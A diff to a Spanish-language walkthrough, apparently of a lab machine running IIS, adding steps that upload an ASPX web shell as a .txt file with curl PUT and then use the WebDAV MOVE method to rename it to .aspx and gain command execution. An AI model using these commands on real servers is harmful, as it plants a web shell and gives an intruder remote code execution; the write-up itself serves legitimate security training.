@@ -29,5 +29,19 @@ Al ser un *ISS* lo mas critico seria que se nos permitiese subir extensiones com
 
 No nos deja subir este tipo de archivos pero esta el método `MOVE` habilitado, lo cual nos puede permitir subir un archivo con una *Web Shell* en un `.txt` con la opción `PUT` y una vez este archivo este cargado dentro del servicio hacer un `MOVE` y transfórmalo en una archivo `.aspx` con nuestra shell.
 
+Subiremos la `aspx_cmd.aspx` con nombre de `aspxcmd.txt` para que no tenganmos problema al subirlo
+```shell
+curl -s -X PUT http://10.129.60.207/aspxcmd.txt -d @aspx_cmd.aspx
+```
+
+Con subirlo así todavía esta *Web Shell* no va a ser interpretada, ahora usaremos la opción `MOVE` para mover el `.txt` y transformarlo en `.aspx` realizando un renombramiento de archivo.
+```shell
+curl -s -X MOVE -H "Destination:http://10.129.60.207/aspxcmd.aspx" http://10.129.60.207/aspxcmd.txt
+```
+
+Hemos usado la cabecera `Destination` para indicar que el archivo `.txt` queremos que sea movido a la misma ubicación bajo el mismo nombre únicamente cambiando la extensión por `.aspx`
+
+Ahora al acceder a esta *Web Shell* a través del navegador vemos que tenemos la capacidad de ejecución de comandos.
+![[Pasted image 20260922100219.png]]
 
 
